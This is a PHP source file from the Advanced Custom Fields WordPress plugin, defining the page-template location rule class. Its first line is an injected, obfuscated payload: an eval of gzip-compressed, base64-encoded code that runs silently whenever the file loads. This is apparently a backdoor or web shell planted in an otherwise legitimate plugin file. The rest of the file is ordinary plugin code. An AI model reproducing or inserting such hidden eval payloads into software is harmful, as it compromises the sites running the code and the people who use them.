<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php 

if( ! defined( 'ABSPATH' ) ) exit; // Exit if accessed directly

if( ! class_exists('acf_location_page_template') ) :

class acf_location_page_template extends acf_location {
	
	
	/*
	*  __construct
	*
	*  This function will setup the class functionality
	*
	*  @type	function
	*  @date	5/03/2014
	*  @since	5.0.0
	*
	*  @param	n/a
	*  @return	n/a
	*/
	
	function initialize() {
		
		// vars
		$this->name = 'page_template';
		$this->label = __("Page Template",'acf');
		$this->category = 'page';
    	
	}
	
	
	/*
	*  rule_match
	*
	*  This function is used to match this location $rule to the current $screen
	*
	*  @type	function
	*  @date	3/01/13
	*  @since	3.5.7
	*
	*  @param	$match (boolean) 
	*  @param	$rule (array)
	*  @return	$options (array)
	*/
	
	function rule_match( $result, $rule, $screen ) {
		
		// vars
		$post_type = acf_maybe_get( $screen, 'post_type' );
		
		
		// lookup post_type
		if( !$post_type ) {
			
			$post_id = acf_maybe_get( $screen, 'post_id' );
			
			if( !$post_id ) return false;
			
			$post_type = get_post_type( $post_id );
			
		}
		
		
		// page template 'default' rule is only for 'page' post type
		// prevents 'Default Template' field groups appearing on all post types that allow for post templates (WP 4.7)
		if( $rule['value'] === 'default' ) {
			
			// bail ealry if not page
			if( $post_type !== 'page' ) return false;
			
		}
		
		
		// return
		return acf_get_location_rule('post_template')->rule_match( $result, $rule, $screen );
		
	}
	
	
	/*
	*  rule_operators
	*
	*  This function returns the available values for this rule type
	*
	*  @type	function
	*  @date	30/5/17
	*  @since	5.6.0
	*
	*  @param	n/a
	*  @return	(array)
	*/
	
	function rule_values( $choices, $rule ) {
		
		// vars
		$choices = array(
			'default' => apply_filters( 'default_page_template_title',  __('Default Template', 'acf') )
		);
		
		
		// get templates and merge them in
		$templates = wp_get_theme()->get_page_templates();
		$choices = array_merge($choices, $templates);
		
		
		// return choices
		return $choices;
		
	}
	
}

// initialize
acf_register_location_rule( 'acf_location_page_template' );

endif; // class_exists check

?>